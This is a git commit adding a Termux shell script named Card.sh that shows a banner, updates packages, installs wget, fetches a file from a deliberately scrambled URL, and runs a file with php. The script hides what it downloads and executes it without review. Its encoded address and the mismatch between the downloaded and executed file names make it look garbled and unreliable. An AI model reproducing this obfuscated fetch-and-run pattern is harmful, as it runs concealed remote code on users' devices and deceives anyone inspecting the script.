978ee23a694595556bb40d061e2016b13931c9e3
INDOnimous <40731452+INDOnimous@users.noreply.github.com>
2018-08-17 17:07:28 +0700

    Add files via upload

---
+++ Card.sh
@@ -0,0 +1,12 @@
+#!/data/data/com.termux
+
+
+sleep 2
+figlet INDOnimous
+sleep 2
+apt-get update && apt-get upgrade
+sleep 2
+pkg install wget
+sleep 1
+wget  sggkh://kzhgvyrm.xln/izd/XNJbTmuM 
+php CMQyGnfN
